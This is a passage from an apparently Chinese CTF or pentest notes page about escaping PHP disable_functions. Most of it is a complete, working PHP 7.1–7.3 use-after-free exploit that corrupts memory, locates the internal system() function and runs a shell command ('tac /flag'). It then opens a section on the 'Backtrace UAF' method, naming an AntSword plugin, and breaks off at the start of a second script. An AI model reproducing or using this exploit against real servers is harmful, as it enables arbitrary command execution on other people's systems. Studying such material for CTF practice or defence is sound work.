class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php版本：</span></span><br><span class="line"><span class="comment">#7.1 - all versions to date</span></span><br><span class="line"><span class="comment">#7.2 &lt; 7.2.19 (released: 30 May 2019)</span></span><br><span class="line"><span class="comment">#7.3 &lt; 7.3.6 (released: 30 May 2019)</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;tac /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">8</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$spl1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x18</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$spl1</span>::<span class="variable">$leak</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$y</span>, <span class="variable">$cmd</span>, <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>, <span class="variable">$n_alloc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$contiguous</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$contiguous</span>[] = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$room</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$room</span>[] = <span class="keyword">new</span> <span class="title function_ invoke__">Z</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_protector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$y</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protector</span> = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        <span class="variable">$x</span>-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        <span class="variable">$x</span>-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line">        <span class="variable">$spl2</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        <span class="variable">$class_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        <span class="variable">$handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        <span class="variable">$php_heap</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        <span class="variable">$fake_obj</span> = <span class="variable">$abc_addr</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>, <span class="variable">$abc_addr</span>); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak1</span>(<span class="variable">$class_entry</span> + <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        <span class="variable">$fake_tbl_off</span> = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x30</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x38</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$handlers</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_off</span> = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$function_data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_data</span> + <span class="number">0x40</span> * <span class="number">4</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_bkt_off</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>, <span class="variable">$fake_bkt_addr</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x58</span> + <span class="variable">$i</span> * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        <span class="variable">$function_zval</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">12</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc,  <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_zval</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="number">0x30</span>, <span class="variable">$zif_system</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>, <span class="variable">$fake_bkt_addr</span> + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span>-&gt;<span class="title function_ invoke__">offsetGet</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">Z</span>()];</span><br><span class="line"><span class="title function_ invoke__">json_encode</span>([&amp;<span class="variable">$y</span>]);</span><br></pre></td></tr></table></figure>
<h2 id="17-7-Backtrace-UAF"><a href="#17-7-Backtrace-UAF" class="headerlink" title="17.7 Backtrace UAF"></a>17.7 Backtrace UAF</h2><p>方法一：蚁剑插件PHP7_Backtrace_UAF</p>
<p>方法二：脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 